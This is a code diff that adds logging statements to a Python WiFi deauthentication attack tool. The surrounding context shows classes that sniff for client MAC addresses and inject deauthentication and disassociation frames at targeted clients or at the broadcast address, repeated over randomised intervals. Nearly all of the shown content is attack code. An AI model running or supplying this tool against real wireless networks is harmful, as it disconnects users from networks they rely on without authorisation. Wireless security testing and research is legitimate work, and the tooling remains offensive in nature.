@@ -1,3 +1,4 @@
+import logging
 import random
 import time
 
@@ -31,11 +32,19 @@ class WiFiDeauthAttack(object):
         self.interface.set_channel(channel)
 
         # Finally, run the attack as many times as requested.
+        message = 'Running attack: iteration %d.'
+        self._log(message % 1)
         self._do_run()
-        for _ in range(executions-1):
+        for i in range(executions-1):
             idle_time = random.randint(*persistence_times)
+            self._log('Retrying again in %d seconds.' % idle_time)
             time.sleep(idle_time)
+            self._log(message % (i+2))
             self._do_run()
+        self._log('Done!')
+            
+    def _log(self, message):
+        logging.log(logging.INFO, message)
         
     def _build_packet(self, seq, source, dest, body):
         encoded_seq = seq << 4
@@ -82,15 +91,20 @@ class FixedClientDeauthAttack(WiFiDeauthAttack):
         self._replicate_and_send(client_packet, ap_packet)
 
     def _do_run(self):
+        msg = 'Injecting deauth packets for client %s using SN=%d...'
         for seq in xrange(self.INITIAL_SEQ_NUMBER,
                           self.INITIAL_SEQ_NUMBER+self.NUM_PROBES):
             for client in self.clients:
+                self._log(msg % (client, seq))
                 self._deauth_client(client, seq)
 
 
 class GlobalDisassociationAttack(WiFiDeauthAttack):
     
     def _do_run(self):
+        msg = 'Injecting disassociation and deauth packets sent to broadcast address %s...' %\
+               self.WIFI_BROADCAST_ADDRESS
+        self._log(msg)
         for seq in xrange(self.INITIAL_SEQ_NUMBER,
                           self.INITIAL_SEQ_NUMBER+self.NUM_PROBES):
             deauth_packet = self._build_deauth_packet(seq, source=self.bssid,
@@ -136,7 +150,9 @@ class SniffedClientDeauthAttack(WiFiDeauthAttack):
         # First get client addresses by sniffing the network. Avoid computing
         # this if it was already done in previous executions.
         if not self.clients:
+            self._log('Sniffing network...')
             self.clients = self._get_client_addresses()
+            self._log('Done. Found %d clients.' % len(self.clients))
         
         # Now launch the attack against these clients.
         attack = FixedClientDeauthAttack(self.interface, self.bssid, self.clients)
